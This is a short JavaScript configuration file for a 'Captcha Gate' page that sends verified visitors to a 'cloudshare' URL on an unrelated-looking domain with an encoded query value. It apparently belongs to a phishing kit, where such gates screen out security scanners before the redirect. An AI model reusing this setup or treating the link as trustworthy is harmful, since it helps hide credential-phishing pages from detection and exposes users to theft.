// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  CAPTCHA GATE — Configuration
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

const config = {
  // The URL visitors are sent to after passing verification.
  targetUrl: "https://cloudshare.keusdarhomes.com?aEJyAHK6cHkFPQ=a2dxcWxwZQ==",

  // Encryption key for CAPTCHA tokens. Change this to something random.
  // Generate one:  node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
  secret: "f387yf93jkd093hfe93hf3jefd37yde8xdv",

  // CAPTCHA settings
  captcha: {
    length: 6,          // Number of characters
    expiry: 180,        // Seconds before a challenge expires
    caseSensitive: false,
  },

  // Page content
  branding: {
    title: "Verify you're human",
    subtitle: "Enter the characters shown below to continue.",
    footer: "Protected by Captcha Gate",
  },
};

module.exports = config;
